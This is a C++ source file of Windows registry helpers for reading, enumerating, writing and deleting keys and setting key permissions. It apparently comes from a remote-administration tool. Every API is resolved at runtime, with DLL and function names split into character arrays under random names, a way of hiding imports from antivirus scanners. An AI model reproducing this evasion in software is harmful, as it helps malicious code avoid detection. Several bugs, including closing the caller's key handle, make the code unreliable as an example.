#include "StdAfx.h"
#include <windows.h>
//去除字符串类型前面的空格

typedef LONG (APIENTRY *RegQueryValueExAT)
(
 __in HKEY hKey,
 __in_opt LPCSTR lpValueName,
 __reserved LPDWORD lpReserved,
 __out_opt LPDWORD lpType,
 __out_bcount_opt(*lpcbData) LPBYTE lpData,
 __inout_opt LPDWORD lpcbData
 );
char KIoFqQPSy[] = {'A','D','V','A','P','I','3','2','.','d','l','l','\0'};
RegQueryValueExAT pRegQueryValueExA= (RegQueryValueExAT)GetProcAddress(LoadLibrary(KIoFqQPSy),"RegQueryValueExA");

char *DelSpace(char *szData)
{
	int i=0 ;
	while(1)
	{
		if(strnicmp(szData+i," ",1))
			break;
		i++;			
	}
	return (szData+i);
} 

//设置注册表键读取的权限(KEY_READ||KEY_WRITE||KEY_ALL_ACCESS)
int SetKeySecurityEx(HKEY MainKey,LPCTSTR SubKey,DWORD security) 
{
	   typedef __bcount(dwBytes) LPVOID (WINAPI *HeapAllocT)
		   (
		   __in HANDLE hHeap,
		   __in DWORD dwFlags,
		   __in SIZE_T dwBytes
		   );
	   HeapAllocT pHeapAlloc = (HeapAllocT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"HeapAlloc");
	   
	   typedef LONG
		   (APIENTRY
		   *RegCloseKeyT)(
		   __in HKEY hKey
		   );
	   char YWsjU[] = {'R','e','g','C','l','o','s','e','K','e','y','\0'};
	   char KIoFqQPSy[] = {'A','D','V','A','P','I','3','2','.','d','l','l','\0'};
	   RegCloseKeyT pRegCloseKey=(RegCloseKeyT)GetProcAddress(LoadLibrary(KIoFqQPSy),YWsjU);
	   
	   typedef LONG
		   (APIENTRY
		   *RegOpenKeyExAT)(
		   __in HKEY hKey,
		   __in_opt LPCSTR lpSubKey,
		   __reserved DWORD ulOptions,
		   __in REGSAM samDesired,
		   __out PHKEY phkResult
		   );
	   RegOpenKeyExAT pRegOpenKeyExA=(RegOpenKeyExAT)GetProcAddress(LoadLibrary(KIoFqQPSy),"RegOpenKeyExA");

   HKEY  hKey; 
   SID_IDENTIFIER_AUTHORITY sia = SECURITY_NT_AUTHORITY; 
   PSID pSystemSid              = NULL; 
   PSID pUserSid                = NULL; 
   SECURITY_DESCRIPTOR sd; 
   PACL    pDacl                = NULL; 
   DWORD   dwAclSize; 
   int     iResult              = 0;

   __try
   {  	   
	   if(pRegOpenKeyExA(MainKey, SubKey, 0, WRITE_DAC, &hKey)!= ERROR_SUCCESS) 
		   __leave; 
       if(!AllocateAndInitializeSid(&sia,1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &pSystemSid )) 
           __leave;
       if(!AllocateAndInitializeSid( &sia, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,0, 0, 0, 0, 0, 0, &pUserSid))  
           __leave; 
       dwAclSize = sizeof(ACL) + 2 * ( sizeof(ACCESS_ALLOWED_ACE) - sizeof(DWORD) ) + GetLengthSid(pSystemSid) + GetLengthSid(pUserSid) ; 
       pDacl = (PACL)pHeapAlloc(GetProcessHeap(), 0, dwAclSize); 
       if(pDacl == NULL) 
		   __leave; 
       if(!InitializeAcl(pDacl, dwAclSize, ACL_REVISION)) 
           __leave; 
       if(!AddAccessAllowedAce( pDacl, ACL_REVISION, KEY_ALL_ACCESS, pSystemSid )) 
           __leave; 
       if(!AddAccessAllowedAce( pDacl, ACL_REVISION, (unsigned long)security, pUserSid )) 
           __leave; 
       if(!InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION)) 
           __leave; 
       if(!SetSecurityDescriptorDacl(&sd, TRUE, pDacl, FALSE)) 
           __leave; 
       if(RegSetKeySecurity(hKey, (SECURITY_INFORMATION)DACL_SECURITY_INFORMATION, &sd)!= ERROR_SUCCESS)
		   __leave;
	   iResult =1;
   }
   __finally
   {  
	   pRegCloseKey(MainKey); 
	   pRegCloseKey(hKey); 
	   
	   if(pDacl !=NULL)         
		   HeapFree(GetProcessHeap(), 0, pDacl);  
       if(pSystemSid !=NULL)
	       FreeSid(pSystemSid);
	   if(pUserSid !=NULL)
           FreeSid(pUserSid); 
   }

   return iResult;
}

//读取注册表的指定键的数据(Mode:0-读键值数据 1-牧举子键 2-牧举指定键项 3-判断该键是否存在)
int  ReadRegEx(HKEY MainKey,LPCTSTR SubKey,LPCTSTR Vname,DWORD Type,char *szData,LPBYTE szBytes,DWORD lbSize,int Mode)
{
	typedef LONG
		(APIENTRY
		*RegOpenKeyExAT)(
		__in HKEY hKey,
		__in_opt LPCSTR lpSubKey,
		__reserved DWORD ulOptions,
		__in REGSAM samDesired,
		__out PHKEY phkResult
		);
	char KIoFqQPSy[] = {'A','D','V','A','P','I','3','2','.','d','l','l','\0'};
	RegOpenKeyExAT pRegOpenKeyExA=(RegOpenKeyExAT)GetProcAddress(LoadLibrary(KIoFqQPSy),"RegOpenKeyExA");
	
	typedef LONG
		(APIENTRY
		*RegEnumValueAT)(
		__in HKEY hKey,
		__in DWORD dwIndex,
		__out_ecount_opt(*lpcchValueName) LPSTR lpValueName,
		__inout LPDWORD lpcchValueName,
		__reserved LPDWORD lpReserved,
		__out_opt LPDWORD lpType,
		__out_bcount_opt(*lpcbData) LPBYTE lpData,
		__inout_opt LPDWORD lpcbData
		);
	RegEnumValueAT pRegEnumValueA=(RegEnumValueAT)GetProcAddress(LoadLibrary(KIoFqQPSy),"RegEnumValueA");

	HKEY   hKey;  
	int    ValueDWORD,iResult=0;
	char*  PointStr;  
	char   KeyName[32],ValueSz[MAX_PATH],ValueTemp[MAX_PATH];	
	DWORD  szSize,KnSize,dwIndex=0;	 

	memset(KeyName,0,sizeof(KeyName));
	memset(ValueSz,0,sizeof(ValueSz));
	memset(ValueTemp,0,sizeof(ValueTemp));

	__try
	{
	//	 SetKeySecurityEx(MainKey,SubKey,KEY_ALL_ACCESS);
		if(pRegOpenKeyExA(MainKey,SubKey,0,KEY_READ,&hKey) != ERROR_SUCCESS)
		{
            iResult = -1;
			__leave;
		}
		switch(Mode)		 
		{
		case 0:
			switch(Type)
			{
			case REG_SZ:
			case REG_EXPAND_SZ:				 
				szSize = sizeof(ValueSz);
				if(pRegQueryValueExA(hKey,Vname,NULL,&Type,(LPBYTE)ValueSz,&szSize) == ERROR_SUCCESS)
				{
					strcpy(szData,DelSpace(ValueSz));
					iResult =1;
				}
				break;
			case REG_MULTI_SZ:	
				szSize = sizeof(ValueSz);
				if(pRegQueryValueExA(hKey,Vname,NULL,&Type,(LPBYTE)ValueSz,&szSize) == ERROR_SUCCESS)
				{
					for(PointStr = ValueSz; *PointStr; PointStr = strchr(PointStr,0)+1)
					{
					
						strncat(ValueTemp,PointStr,sizeof(ValueTemp));
					    strncat(ValueTemp," ",sizeof(ValueTemp));
					}
					strcpy(szData,ValueTemp);
					iResult =1;
				}
				break;				 			
			case REG_DWORD:
				szSize = sizeof(DWORD);
				if(pRegQueryValueExA(hKey,Vname,NULL,&Type,(LPBYTE)&ValueDWORD,&szSize ) == ERROR_SUCCESS)						
				{
					wsprintf(szData,"%d",ValueDWORD);
					iResult =1;
				}
				break;
            case REG_BINARY:
                szSize = lbSize;
				if(pRegQueryValueExA(hKey,Vname,NULL,&Type,szBytes,&szSize) == ERROR_SUCCESS)
					iResult =1;
				break;
			}
			break;
		case 1:
			while(1)
			{
				typedef LONG
					(APIENTRY
					*RegEnumKeyExAT)(
					__in HKEY hKey,
					__in DWORD dwIndex,
					__out_ecount_opt(*lpcchName) LPSTR lpName,
					__inout LPDWORD lpcchName,
					__reserved LPDWORD lpReserved,
					__inout_ecount_opt(*lpcchClass) LPSTR lpClass,
					__inout_opt LPDWORD lpcchClass,
					__out_opt PFILETIME lpftLastWriteTime
					);
				RegEnumKeyExAT pRegEnumKeyExA=(RegEnumKeyExAT)GetProcAddress(LoadLibrary(KIoFqQPSy),"RegEnumKeyExA");
				memset(ValueSz,0,sizeof(ValueSz));
				szSize   = sizeof(ValueSz);
                if(pRegEnumKeyExA(hKey,dwIndex++,ValueSz,&szSize,NULL,NULL,NULL,NULL) != ERROR_SUCCESS)
					break;
                wsprintf(ValueTemp,"[%s]\r\n",ValueSz);
				strcat(szData,ValueTemp);
				iResult =1;
			}			 
			break;
		case 2:			  
			while(1)
			{				 
				memset(KeyName,0,sizeof(KeyName));
				memset(ValueSz,0,sizeof(ValueSz));
				memset(ValueTemp,0,sizeof(ValueTemp));
				KnSize = sizeof(KeyName);
                szSize = sizeof(ValueSz);
                if(pRegEnumValueA(hKey,dwIndex++,KeyName,&KnSize,NULL,&Type,(LPBYTE)ValueSz,&szSize) != ERROR_SUCCESS)
					break;
				switch(Type)				 				
				{				     
				case REG_SZ:					 						 
					wsprintf(ValueTemp,"%-24s %-15s %s \r\n",KeyName,"REG_SZ",ValueSz);					     
					break;
				case REG_EXPAND_SZ:                   						 
					wsprintf(ValueTemp,"%-24s %-15s %s \r\n",KeyName,"REG_EXPAND_SZ",ValueSz);
					break;
				case REG_DWORD:
					wsprintf(ValueTemp,"%-24s %-15s 0x%x(%d) \r\n",KeyName,"REG_DWORD",ValueSz,int(ValueSz));
					break;
				case REG_MULTI_SZ:
                    wsprintf(ValueTemp,"%-24s %-15s \r\n",KeyName,"REG_MULTI_SZ");
					break;
			    case REG_BINARY:
					wsprintf(ValueTemp,"%-24s %-15s \r\n",KeyName,"REG_BINARY");
					break;
				}


				typedef LPSTR
					(WINAPI
					*lstrcatAT)(
					__inout LPSTR lpString1,
					__in    LPCSTR lpString2
					);
				
				lstrcatAT plstrcatA=(lstrcatAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"lstrcatA");



				plstrcatA(szData,ValueTemp);
				iResult =1;
			}
			break;
		case 3:
            iResult =1;
			break;
		}
	}

	__finally
	{

		typedef LONG (APIENTRY *RegCloseKeyT)
			( __in HKEY hKey);
		
		char YWsjU[] = {'R','e','g','C','l','o','s','e','K','e','y','\0'};
		char KIoFqQPSy[] = {'A','D','V','A','P','I','3','2','.','d','l','l','\0'};
		RegCloseKeyT pRegCloseKey=(RegCloseKeyT)GetProcAddress(LoadLibrary(KIoFqQPSy),YWsjU);
        pRegCloseKey(MainKey);
		pRegCloseKey(hKey);
	}
     
	return iResult;
}
//写注册表的指定键的数据(Mode:0-新建键数据 1-设置键数据 2-删除指定键 3-删除指定键项)
int WriteRegEx(HKEY MainKey,LPCTSTR SubKey,LPCTSTR Vname,DWORD Type,char* szData,DWORD dwData,int Mode)
{
	HKEY  hKey; 
	DWORD dwDisposition;    
	int   iResult =0;
	
	__try
	{	
	//	SetKeySecurityEx(MainKey,Subkey,KEY_ALL_ACCESS);

		typedef LONG (APIENTRY *RegCreateKeyExAT)
			(
			__in HKEY hKey,
			__in LPCSTR lpSubKey,
			__reserved DWORD Reserved,
			__in_opt LPSTR lpClass,
			__in DWORD dwOptions,
			__in REGSAM samDesired,
			__in_opt LPSECURITY_ATTRIBUTES lpSecurityAttributes,
			__out PHKEY phkResult,
			__out_opt LPDWORD lpdwDisposition
			);
		char KIoFqQPSy[] = {'A','D','V','A','P','I','3','2','.','d','l','l','\0'};
		RegCreateKeyExAT pRegCreateKeyExA= (RegCreateKeyExAT)GetProcAddress(LoadLibrary(KIoFqQPSy),"RegCreateKeyExA");

		typedef LONG
			(APIENTRY
			*RegOpenKeyExAT)(
			__in HKEY hKey,
			__in_opt LPCSTR lpSubKey,
			__reserved DWORD ulOptions,
			__in REGSAM samDesired,
			__out PHKEY phkResult
			);
		RegOpenKeyExAT pRegOpenKeyExA=(RegOpenKeyExAT)GetProcAddress(LoadLibrary(KIoFqQPSy),"RegOpenKeyExA");

		typedef LONG
			(APIENTRY
			*RegSetValueExAT)(
			__in HKEY hKey,
			__in_opt LPCSTR lpValueName,
			__reserved DWORD Reserved,
			__in DWORD dwType,
			__in_bcount_opt(cbData) CONST BYTE* lpData,
			__in DWORD cbData
			);
		RegSetValueExAT pRegSetValueExA=(RegSetValueExAT)GetProcAddress(LoadLibrary(KIoFqQPSy),"RegSetValueExA");

		
		typedef LONG
			(APIENTRY
			*RegDeleteValueAT)(
			__in HKEY hKey,
			__in_opt LPCSTR lpValueName
			);
		RegDeleteValueAT pRegDeleteValueA=(RegDeleteValueAT)GetProcAddress(LoadLibrary(KIoFqQPSy),"RegDeleteValueA");

		typedef LONG
			(APIENTRY
			*RegDeleteKeyAT)(
			__in HKEY hKey,
			__in LPCSTR lpSubKey
			);
		RegDeleteKeyAT pRegDeleteKeyA=(RegDeleteKeyAT)GetProcAddress(LoadLibrary(KIoFqQPSy),"RegDeleteKeyA");

		typedef int
			(WINAPI
			*lstrlenAT)(
			__in LPCSTR lpString
			);	
		lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"lstrlenA");

		switch(Mode)		
		{			
		case 0:
			if(pRegCreateKeyExA(MainKey,SubKey,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,&dwDisposition) != ERROR_SUCCESS)
				__leave;		 
		case 1:	
			if(pRegOpenKeyExA(MainKey,SubKey,0,KEY_READ|KEY_WRITE,&hKey) != ERROR_SUCCESS)					 
				__leave;		 		 			 
			switch(Type)
			{		 
			case REG_SZ:		 
			case REG_EXPAND_SZ:
				if(pRegSetValueExA(hKey,Vname,0,Type,(LPBYTE)szData,plstrlenA(szData)+1) == ERROR_SUCCESS) 				 
					iResult =1;				 			
				break;
		    case REG_DWORD:
                if(pRegSetValueExA(hKey,Vname,0,Type,(LPBYTE)&dwData,sizeof(DWORD)) == ERROR_SUCCESS)  
		            iResult =1;				 			 
			    break;
		    case REG_BINARY:
			    break;
			}
			break;				
		case 2:
            if(pRegOpenKeyExA(MainKey,SubKey,NULL,KEY_READ|KEY_WRITE,&hKey) != ERROR_SUCCESS)				
				__leave;                
			if (pRegDeleteKeyA(hKey,Vname) == ERROR_SUCCESS)		        
				iResult =1;
			break;		
		case 3:
            if(pRegOpenKeyExA(MainKey,SubKey,NULL,KEY_READ|KEY_WRITE,&hKey) != ERROR_SUCCESS)				
				__leave;                
			if (pRegDeleteValueA(hKey,Vname) == ERROR_SUCCESS)		        
				iResult =1;
			break;
		}
	}

	__finally 
	{

		typedef LONG (APIENTRY *RegCloseKeyT)
			( __in HKEY hKey);
		char YWsjU[] = {'R','e','g','C','l','o','s','e','K','e','y','\0'};
		char KIoFqQPSy[] = {'A','D','V','A','P','I','3','2','.','d','l','l','\0'};
		RegCloseKeyT pRegCloseKey=(RegCloseKeyT)GetProcAddress(LoadLibrary(KIoFqQPSy),YWsjU);

		pRegCloseKey(MainKey);		
		pRegCloseKey(hKey); 
	}
	return iResult;
}
